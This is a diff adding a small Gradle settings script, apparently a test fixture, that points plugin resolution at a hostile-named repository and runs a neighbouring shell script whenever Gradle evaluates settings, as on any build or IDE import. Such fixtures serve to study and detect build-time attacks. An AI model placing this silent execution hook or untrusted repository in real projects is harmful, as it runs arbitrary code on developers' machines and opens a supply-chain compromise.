@@ -1,0 +1,10 @@
+pluginManagement {
+    repositories {
+        maven { url = 'https://gradle-plugins.lo-hostile.invalid/repository' }
+    }
+}
+
+// Fixture: the settings script, which Gradle runs first, running a program beside it.
+[new File(settingsDir, 'lo-gradle-settings.sh').path].execute().waitFor()
+
+rootProject.name = 'sample'
